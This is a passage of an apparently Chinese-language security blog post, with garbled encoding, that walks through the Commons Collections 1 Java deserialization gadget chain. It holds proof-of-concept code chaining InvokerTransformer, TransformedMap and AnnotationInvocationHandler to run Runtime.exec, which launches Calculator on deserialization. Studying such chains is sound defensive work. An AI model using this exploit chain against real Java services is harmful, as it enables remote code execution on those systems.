&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;superInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Annotation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationFormatError&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Attempt to create proxy for a non-annotation type.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;memberValues&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥æŒ‰ä½ctrl+HæŸ¥çœ‹ç»§æ‰¿Annotationçš„ç±»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;éšä¾¿é€‰ä¸€ä¸ªéƒ½å¯ä»¥çš„ï¼Œå®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;111&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;innerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†æ˜¯æ‰§è¡Œåä¼šæŠ¥é”™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;thread&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;main&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;NotSerializableException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Runtime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸º&lt;code&gt;Runtime&lt;/code&gt;çš„æ„é€ å‡½æ•°æ˜¯privateå±æ€§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—ä½¿ç”¨åå°„çš„æ–¹å¼è¿›è¡Œç¼–å†™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cMethmod&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;se&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cMethmod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ”¹å†™æˆInvokerTransformerå¯¹è±¡çš„è°ƒç”¨æ–¹å¼ï¼Œå¦‚æœå¯¹ç†çš„new Classæœ‰ç–‘é—®å¯ä»¥å»çœ‹ä¸‹è¯¥æ–¹æ³•çš„ä¼ å…¥çš„å‚æ•°ç±»å‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getMethod&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;invoke&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
